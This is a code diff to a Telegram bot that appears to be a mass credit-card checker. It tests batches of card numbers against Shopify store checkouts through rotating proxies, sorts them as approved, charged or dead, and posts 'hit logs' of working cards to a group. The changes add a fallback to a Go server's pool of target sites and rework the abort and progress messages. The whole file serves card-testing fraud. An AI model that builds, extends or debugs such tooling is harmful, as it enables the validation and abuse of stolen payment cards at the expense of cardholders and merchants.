@@ -1800,10 +1878,12 @@ async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, us
             await asyncio.gather(
                 send_hit_log_to_group(bot, cc_formatted, response_msg, bin_data,
                                       user_obj, plan_name, proxy_status_formatted,
-                                      api_price, site, "APPROVED"),
+                                      api_price, used_site, "APPROVED",
+                                      receipt=api_receipt, currency=api_currency),
                 send_approved_msg_to_user(bot, cc_formatted, response_msg, bin_data,
                                           proxy_status_formatted, api_price,
-                                          user_obj, plan_name, send_to_extra=False),
+                                          user_obj, plan_name, send_to_extra=False,
+                                          receipt=api_receipt, currency=api_currency),
             )
 
     elif result_status == "DEAD":
@@ -2216,20 +2296,7 @@ async def process_mass_check_background(message: types.Message, bot: Bot, valid_
 
     logging.info(f"🔄 [MSH] Session {session_id} initialized with ProxyManager: {proxy_stats['total_proxies']} proxies (normalized)")
 
-    initial_text = (
-        f"<b><tg-emoji emoji-id='5039895103947146186'>🌐</tg-emoji> 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➛</b> Shopify\n"
-        f"<b><tg-emoji emoji-id='5231200819986047254'>📊</tg-emoji> 𝗦𝘁𝗮𝘁𝘂𝘀 ➛</b> <i>CHECKING</i> <tg-emoji emoji-id='5269531045165816230'>🔄</tg-emoji>\n"
-        f"<b><tg-emoji emoji-id='5388632425314140043'>🔍</tg-emoji> 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 ➛</b> <code>0/{total_cards}</code>\n"
-        f"<b><tg-emoji emoji-id='5341715473882955310'>✅</tg-emoji> 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ➛</b> <b>0</b>\n"
-        f"<b><tg-emoji emoji-id='5436113877181941026'>🔥</tg-emoji> 𝗖𝗵𝗮𝗿𝗴𝗲𝗱 ➛</b> <b>0</b>\n"
-        f"<b><tg-emoji emoji-id='6237864166879663987'>❌</tg-emoji> 𝗗𝗲𝗮𝗱 ➛</b> <b>0</b>\n"
-        f"<b><tg-emoji emoji-id='4915853119839011973'>⚠️</tg-emoji> 𝗘𝗿𝗿𝗼𝗿𝘀 ➛</b> <b>0</b>\n"
-        f"<b><tg-emoji emoji-id='5456140674028019486'>⚡</tg-emoji> 𝗧𝗶𝗺𝗲 ➛</b> <b>0s</b>\n"
-        f"<b><tg-emoji emoji-id='5039653765439816618'>🐈‍⬛</tg-emoji> 𝗗𝗲𝘃 ➛</b> <a href='https://t.me/btcbuoy'>Starkz</a>\n"
-        f"<b><tg-emoji emoji-id='5406683434124859552'>🆔</tg-emoji> 𝗦𝗲𝘀𝘀𝗶𝗼𝗻 𝗜𝗗 ➛</b> <code>{session_id}</code>"
-    )
-
-    # Fix F: defensive read of per-user custom sites.
+    # ── Site resolution: Python custom → Python global → Go pool ─────────
     try:
         user_custom_sites = await asyncio.to_thread(get_user_sites_db, user_id)
     except Exception as e:
@@ -2243,9 +2310,72 @@ async def process_mass_check_background(message: types.Message, bot: Bot, valid_
         active_sites = get_sites()
         site_source = f"GLOBAL ({len(active_sites)} sites)"
 
-    # Fix G: build the session dict FIRST so any button tap arriving during
-    # the reply latency finds an existing session. msg_id starts at None
-    # and update_progress_message() no-ops until it is set.
+    # ── Cross-check against the Go server's own sites.txt ────────────────
+    go_health = await _check_go_health()
+    go_sites = int(go_health.get("sites", 0)) if go_health else 0
+    go_busy = int(go_health.get("workers_busy", 0)) if go_health else 0
+    go_cap = int(go_health.get("workers_cap", 0)) if go_health else 0
+
+    use_go_sites = (not active_sites) and go_sites > 0
+
+    # If neither side has sites, build the session and abort cleanly.
+    if not active_sites and go_sites == 0:
+        # Build a minimal session so the message can be edited deterministically
+        session_dict = {
+            "session_id": session_id, "status": "FINISHED", "chat_id": chat_id,
+            "user_id": user_id, "msg_id": None, "user_msg_id": message.message_id,
+            "total": total_cards, "checked": 0, "approved": 0, "charged": 0,
+            "dead": 0, "errors": 0, "start_time": time.time(), "tasks": [],
+            "proxies": user_proxies, "proxy_manager": proxy_manager,
+            "bad_proxies": [], "last_text": "", "last_update_time": 0,
+            "live_cards": [], "dead_cards": [], "charged_cards": [],
+            "error_cards": [], "user_obj": user_obj, "plan_name": plan_name,
+            "is_group": is_group, "sites_list": [], "use_go_sites": False,
+        }
+        MSH_SESSIONS[session_id] = session_dict
+        try:
+            progress_msg = await message.reply(
+                "❌ <b>No sites available anywhere.</b>\n\n"
+                "• Python <code>sites.txt</code>: <b>0</b>\n"
+                "• Go server <code>sites.txt</code>: <b>0</b>\n\n"
+                "Add sites on either side, then retry.\n"
+                "• <code>/addsite</code> for per-user sites\n"
+                "• <code>/sitechk</code> for a global audit",
+                parse_mode="HTML",
+            )
+            session_dict["msg_id"] = progress_msg.message_id
+        except Exception as e:
+            logging.error(f"[MSH] Could not reply with no-sites message: {e}")
+        logging.error(f"[MSH] Session {session_id} aborted — no sites on Python OR Go side")
+        return
+
+    if go_sites == 0:
+        logging.warning(
+            f"[MSH] Go server reports 0 sites — every card will likely fail with 503. "
+            f"Python still has {len(active_sites)} site(s). "
+            f"Consider syncing sites.txt between Python and Go."
+        )
+
+    if use_go_sites:
+        logging.warning(
+            f"[MSH] Python has 0 sites; falling back to Go's internal site pool "
+            f"({go_sites} sites). Fake-charge verification will be DISABLED for this run."
+        )
+
+    initial_text = (
+        f"<b><tg-emoji emoji-id='5039895103947146186'>🌐</tg-emoji> 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➛</b> Shopify\n"
+        f"<b><tg-emoji emoji-id='5231200819986047254'>📊</tg-emoji> 𝗦𝘁𝗮𝘁𝘂𝘀 ➛</b> <i>CHECKING</i> <tg-emoji emoji-id='5269531045165816230'>🔄</tg-emoji>\n"
+        f"<b><tg-emoji emoji-id='5388632425314140043'>🔍</tg-emoji> 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 ➛</b> <code>0/{total_cards}</code>\n"
+        f"<b><tg-emoji emoji-id='5341715473882955310'>✅</tg-emoji> 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ➛</b> <b>0</b>\n"
+        f"<b><tg-emoji emoji-id='5436113877181941026'>🔥</tg-emoji> 𝗖𝗵𝗮𝗿𝗴𝗲𝗱 ➛</b> <b>0</b>\n"
+        f"<b><tg-emoji emoji-id='6237864166879663987'>❌</tg-emoji> 𝗗𝗲𝗮𝗱 ➛</b> <b>0</b>\n"
+        f"<b><tg-emoji emoji-id='4915853119839011973'>⚠️</tg-emoji> 𝗘𝗿𝗿𝗼𝗿𝘀 ➛</b> <b>0</b>\n"
+        f"<b><tg-emoji emoji-id='5456140674028019486'>⚡</tg-emoji> 𝗧𝗶𝗺𝗲 ➛</b> <b>0s</b>\n"
+        f"<b><tg-emoji emoji-id='5039653765439816618'>🐈‍⬛</tg-emoji> 𝗗𝗲𝘃 ➛</b> <a href='https://t.me/btcbuoy'>Starkz</a>\n"
+        f"<b><tg-emoji emoji-id='5406683434124859552'>🆔</tg-emoji> 𝗦𝗲𝘀𝘀𝗶𝗼𝗻 𝗜𝗗 ➛</b> <code>{session_id}</code>\n"
+        f"<b>🌐 𝗦𝗶𝘁𝗲𝘀 ➛</b> Go <b>{go_sites}</b> | Py <b>{len(active_sites)}</b>"
+    )
+
     session_dict = {
         "session_id": session_id,
         "status": "CHECKING",
@@ -2274,6 +2404,8 @@ async def process_mass_check_background(message: types.Message, bot: Bot, valid_
         "plan_name": plan_name,
         "is_group": is_group,
         "sites_list": active_sites,
+        "use_go_sites": use_go_sites,
+        "go_sites_count": go_sites,
     }
     MSH_SESSIONS[session_id] = session_dict
 
@@ -2281,30 +2413,8 @@ async def process_mass_check_background(message: types.Message, bot: Bot, valid_
     progress_msg = await message.reply(initial_text, parse_mode="HTML", reply_markup=initial_buttons)
     session_dict['msg_id'] = progress_msg.message_id
 
-    # Abort early if no sites loaded — one clear message beats N silent failures.
-    if not active_sites:
-        session_dict["status"] = "FINISHED"
-        try:
-            await bot.edit_message_text(
-                chat_id=chat_id,
-                message_id=progress_msg.message_id,
-                text=(
-                    "❌ <b>No sites available in pool.</b>\n\n"
-                    "The bot checked <b>both</b> MongoDB <code>global_sites</code> "
-                    "and <code>sites.txt</code>.\n\n"
-                    "• Add sites with <code>/addsite</code> (per-user)\n"
-                    "• Or run <code>/sitechk</code> (global audit)\n"
-                    "• Verify with <code>/siteall</code>"
-                ),
-                parse_mode="HTML",
-            )
-        except Exception as e:
-            logging.error(f"[MSH] Could not edit progress message on empty-sites abort: {e}")
-        logging.error(f"[MSH] Session {session_id} aborted — no sites in DB or sites.txt")
-        return
-
-    print(f"🚀 [MSH] Started - {total_cards} cards - User: {user_id} - Sites: {site_source} - Proxies: {len(user_proxies)} - Group: {is_group}")
-    logging.info(f"🚀 [MSH] Started - {total_cards} cards - User: {user_id} - Sites: {site_source} - Proxies: {len(user_proxies)} - Group: {is_group}")
+    print(f"🚀 [MSH] Started - {total_cards} cards - User: {user_id} - Sites: {site_source} (Go: {go_sites}) - Proxies: {len(user_proxies)} - Group: {is_group}")
+    logging.info(f"🚀 [MSH] Started - {total_cards} cards - User: {user_id} - Sites: {site_source} (Go: {go_sites}) - Proxies: {len(user_proxies)} - Group: {is_group}")
 
     asyncio.create_task(run_mass_checker(bot, session_id, valid_cards, user_obj, plan_name))
 
